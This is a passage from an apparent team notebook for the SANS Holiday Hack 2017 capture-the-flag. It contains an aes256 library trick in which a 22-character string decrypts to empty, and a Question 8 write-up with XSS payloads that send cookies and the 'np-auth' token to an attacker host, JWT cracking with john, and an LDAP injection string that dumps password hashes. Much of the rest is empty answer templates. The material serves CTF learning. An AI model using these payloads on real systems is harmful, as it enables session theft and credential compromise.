<pre class="src src-js">&gt; x=<span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>
&gt; x.length - aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>,x).length
24
</pre>
</div>

<p>
From the hints, we learn that some of the bytes are used for the IV.
</p>

<p>
The aes library won't let us encrypt an empty string, but we can encrypt a single char:
</p>

<div class="org-src-container">

<pre class="src src-js">&gt; aes256.encrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">''</span>)
TypeError: Provided <span style="font-style: italic;">"plaintext"</span> must be a non-empty string
    at Object.encrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:39:13)
&gt; aes256.encrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'x'</span>)
<span style="font-style: italic;">'L7rwNMwISl2chavT6lILlNM='</span>
&gt; aes256.encrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'x'</span>).length
24
</pre>
</div>

<p>
This gives a ciphertext of length 24 with one byte of = for padding.  This
means that 22 bytes are used for the IV and one byte is used to encrypt the 'x'
itself.
</p>

<p>
So, at this point it is clear that something interesting happens around 22-24 chars.
</p>

<p>
Trying different lengths approaching a length of 22 continues to throw an error
for a while&#x2026;
</p>

<div class="org-src-container">

<pre class="src src-js">&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaa'</span>)
TypeError: Provided <span style="font-style: italic;">"encrypted"</span> must be a non-empty string
    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:68:13)
</pre>
</div>

<p>
Until the error changes:
</p>

<div class="org-src-container">

<pre class="src src-js">&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaa'</span>)
Error: Invalid IV length
    at <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">Decipheriv</span> (internal/crypto/cipher.js:186:16)
    at Object.createDecipheriv (crypto.js:106:10)
    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:78:27)
&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaa'</span>)
<span style="font-style: italic;">''</span>
&gt; <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaa'</span>.length
22
&gt; aes256.decrypt(<span style="font-style: italic;">'key really does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaa'</span>)
<span style="font-style: italic;">''</span>
</pre>
</div>

<p>
Success!  A string of any 22 chars will decrypt to the empty string.
</p>

<p>
An alternative approach would be to edit the aes library and comment out this block:
</p>

<div class="org-src-container">

<pre class="src src-js"><span style="font-weight: bold;">if</span> (<span style="font-weight: bold;">typeof</span> plaintext !== <span style="font-style: italic;">'string'</span> || !plaintext) {
  <span style="font-weight: bold;">throw</span> <span style="font-weight: bold;">new</span> <span style="font-weight: bold; text-decoration: underline;">TypeError</span>(<span style="font-style: italic;">'Provided "plaintext" must be a non-empty string'</span>);
}
</pre>
</div>

<p>
With the throw commented out, we can encrypt an empty string:
</p>

<div class="org-src-container">

<pre class="src src-js">&gt; <span style="font-weight: bold;">var</span> <span style="font-weight: bold; font-style: italic;">aes256</span> = require(<span style="font-style: italic;">'aes256'</span>);
&gt; aes256.encrypt(<span style="font-style: italic;">'whatever'</span>, <span style="font-style: italic;">''</span>)
<span style="font-style: italic;">'SStLU1QxLjmtG/Ea8hMH0Q=='</span>
&gt; ct=aes256.encrypt(<span style="font-style: italic;">'whatever'</span>, <span style="font-style: italic;">''</span>)
<span style="font-style: italic;">'tYcVb4PRsdq4JWl5XMSNgw=='</span>
&gt; aes256.decrypt(<span style="font-style: italic;">'a different key entirely'</span>, ct)
<span style="font-style: italic;">''</span>
&gt; ct.length
24
</pre>
</div>

<p>
The length is different(24 instead of 22), but only because it is padded with 2
bytes of == for base64 purposes.
</p>
</div>
</li></ul>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-6-4-1-6" name="sec-6-4-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-4-1-7" name="sec-6-4-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-4-1-8" name="sec-6-4-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">

<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-6-5" class="outline-3">
<h3 id="sec-6-5"><span class="todo TODO">TODO</span> Question 5</h3>
<div class="outline-text-3" id="text-6-5">
</div><div id="outline-container-answer-template" class="outline-4">
<h4 id="answer-template"><a id="sec-6-5-1" name="sec-6-5-1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-5-1-1" name="sec-6-5-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<ol class="org-ol">
<li>How many infractions are required to be marked as naughty on Santa's
Naughty and Nice List? What are the names of at least six insider
threat moles? Who is throwing the snowballs from the top of the North
Pole Mountain and what is your proof?
</li>
</ol>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-6-5-1-2" name="sec-6-5-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.
</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML
</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
</li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
</li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee
</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection
</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan
</li>
</ul>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-6-5-1-3" name="sec-6-5-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-6-5-1-4" name="sec-6-5-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-6-5-1-5" name="sec-6-5-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-6-5-1-6" name="sec-6-5-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-5-1-7" name="sec-6-5-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-5-1-8" name="sec-6-5-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">

<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-6-6" class="outline-3">
<h3 id="sec-6-6"><span class="todo TODO">TODO</span> Question 6</h3>
<div class="outline-text-3" id="text-6-6">
</div><div id="outline-container-answer-template" class="outline-4">
<h4 id="answer-template"><a id="sec-6-6-1" name="sec-6-6-1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-6-1-1" name="sec-6-6-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<ol class="org-ol">
<li>The North Pole engineering team has introduced an Elf as a Service
(EaaS) platform to optimize resource allocation for mission-critical
Christmas engineering projects at
<a href="http://eaas.northpolechristmastown.com">http://eaas.northpolechristmastown.com</a>. Visit the system and retrieve
instructions for accessing The Great Book page from C:\greatbook.txt.
Then retrieve The Great Book PDF file by following those directions.
What is the title of The Great Book page?
</li>
</ol>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-6-6-1-2" name="sec-6-6-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.
</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML
</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
</li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
</li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee
</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection
</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan
</li>
</ul>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-6-6-1-3" name="sec-6-6-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-6-6-1-4" name="sec-6-6-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-6-6-1-5" name="sec-6-6-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-6-6-1-6" name="sec-6-6-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-6-1-7" name="sec-6-6-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-6-1-8" name="sec-6-6-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">

<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-6-7" class="outline-3">
<h3 id="sec-6-7"><span class="todo TODO">TODO</span> Question 7</h3>
<div class="outline-text-3" id="text-6-7">
</div><div id="outline-container-answer-template" class="outline-4">
<h4 id="answer-template"><a id="sec-6-7-1" name="sec-6-7-1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-7-1-1" name="sec-6-7-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<ol class="org-ol">
<li>Like any other complex SCADA systems, the North Pole uses Elf-Machine
Interfaces (EMI) to monitor and control critical infrastructure
assets. These systems serve many uses, including email access and web
browsing. Gain access to the EMI server through the use of a phishing
attack with your access to the EWA server. Retrieve The Great Book
page from C:\GreatBookPage7.pdf. What does The Great Book page
describe?
</li>
</ol>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-6-7-1-2" name="sec-6-7-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.
</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML
</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
</li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
</li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee
</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection
</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan
</li>
</ul>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-6-7-1-3" name="sec-6-7-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-6-7-1-4" name="sec-6-7-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-6-7-1-5" name="sec-6-7-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-6-7-1-6" name="sec-6-7-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-7-1-7" name="sec-6-7-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-7-1-8" name="sec-6-7-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">

<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-6-8" class="outline-3">
<h3 id="sec-6-8"><span class="todo TODO">TODO</span> Question 8</h3>
<div class="outline-text-3" id="text-6-8">
</div><div id="outline-container-answer-template" class="outline-4">
<h4 id="answer-template"><a id="sec-6-8-1" name="sec-6-8-1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-8-1-1" name="sec-6-8-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<ol class="org-ol">
<li>Fetch the letter to Santa from the North Pole Elf Database at
<a href="http://edb.northpolechristmastown.com">http://edb.northpolechristmastown.com</a>. Who wrote the letter?
</li>
</ol>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-6-8-1-2" name="sec-6-8-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.
</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML
</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
</li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
</li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee
</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection
</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan
</li>
</ul>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-6-8-1-3" name="sec-6-8-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-6-8-1-4" name="sec-6-8-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-6-8-1-5" name="sec-6-8-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
Summarize the reference solution that we found
</p>

<p>
My solution:
</p>

<p>
This was a multi stage exploit.
</p>

<p>
The first stage was XSS via the support request.
</p>

<p>
First I used
</p>

<p>
```
</p>
<p>
http -v &#x2013;form &#x2013;proxy=<a href="http:socks5://@localhost:32080">http:socks5://@localhost:32080</a>  POST <a href="http://edb.northpolechristmastown.com/service">http://edb.northpolechristmastown.com/service</a> \
uid=alabaster.snowball \
email=alabaster.snowball@northpolechristmastown.com \
message="&lt;IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+document.cookie\"&gt;&lt;/img&gt;"
```
</p>

<p>
Then i realized the cookie didn't help, and one needed the token mentioned in the html/javascript source:
</p>

<p>
```
</p>
<p>
http -v &#x2013;form &#x2013;proxy=<a href="http:socks5://@localhost:32080">http:socks5://@localhost:32080</a>  POST <a href="http://edb.northpolechristmastown.com/service">http://edb.northpolechristmastown.com/service</a> \
uid=alabaster.snowball \
email=alabaster.snowball@northpolechristmastown.com \
message="&lt;IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"&gt;&lt;/img&gt;"
```
</p>

<p>
At that point we had the token I stored in [output/jwt](output/jwt) and used jwt2john.py and john to crack it.  The makefile in output shows the process:
</p>

<p>
```
jwt.john: ../tools/jwt2john.py jwt
        python3 ../tools/jwt2john.py $(shell cat jwt) &gt; jwt.john
</p>

<p>
john.txt: jwt.john
        john  &#x2013;format=HMAC-SHA256 jwt.john
        john  &#x2013;format=HMAC-SHA256 jwt.john -show &gt; john.txt
```
</p>

<p>
Once logged in, [tools/edb.py](tools/edb.py) was used to exploit the ldap injection vuln using the search string
</p>

<p>
name=))(department=it)(|(cn=
</p>

<p>
and by passing * as the attributes query field. With that query and all
attributes it is able to grab the entire ldap database including password
hashes.
</p>

<p>
The letter page requires a valid password, convienently a google search for santas md5 password quickly finds a valid password.
</p>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-6-8-1-6" name="sec-6-8-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-8-1-7" name="sec-6-8-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
Do we know what issue(s) people were running into?
</p>

<p>
Cracking the JWT key was tricky without the propper tools.
My first python based solution was broken.  A fixed version was too slow.
running it using pypy helped a bit, but the pyjwt library is not optimized for cracking.
<a href="https://github.com/lmammino/jwt-cracker">https://github.com/lmammino/jwt-cracker</a> was a bit faster, but john outperformed
everything.  The hard part was finding out how to use john to crack a jwt secret key.
</p>
</div>
</li>

<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-8-1-8" name="sec-6-8-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">

<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-6-9" class="outline-3">
<h3 id="sec-6-9"><span class="todo TODO">TODO</span> Question 9</h3>
<div class="outline-text-3" id="text-6-9">
</div><div id="outline-container-answer-template" class="outline-4">
<h4 id="answer-template"><a id="sec-6-9-1" name="sec-6-9-1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-9-1-1" name="sec-6-9-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<ol class="org-ol">
